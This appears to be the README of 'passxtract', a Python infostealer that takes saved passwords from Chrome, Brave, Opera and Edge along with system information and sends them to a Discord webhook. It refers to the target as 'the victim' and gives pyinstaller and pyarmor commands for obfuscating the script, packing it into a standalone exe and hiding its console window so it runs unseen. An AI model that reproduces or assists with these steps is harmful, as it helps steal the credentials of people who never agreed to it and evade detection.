passxtract, extracts all passwords in the browsers: Google Chrome, Brave, Opera & Microsoft Edge
also steals some system info

results would be sent to discord webhook(edit the webhook url at line:36)

if the victim does not have python installed convert main.py into exe steps are here:

pip install pyinstaller==3.4 pyarmor
pyarmor pack -e " -F -w" main.py

pyarmor pack -e --- module to encrypt the file and convert it into exe

-F --- make 1 standalone file, exe should be in the dist folder (delete pycache & build folder if u want)

-w --- hides the console when executed

main.py --- the file
